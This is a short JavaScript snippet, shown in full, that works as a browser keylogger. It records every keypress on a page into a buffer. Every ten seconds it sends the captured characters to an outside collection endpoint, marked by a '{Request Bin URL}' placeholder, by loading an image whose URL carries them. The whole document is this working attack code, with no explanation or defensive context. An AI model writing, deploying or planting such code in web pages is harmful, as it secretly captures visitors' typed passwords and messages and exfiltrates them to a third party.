var keys = '';
document.onkeypress = function (e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    if (keys.length > 0){
        new Image().src = 'http://{Request Bin URL}?c=' + keys;
    }
    keys = '';
}, 10000);
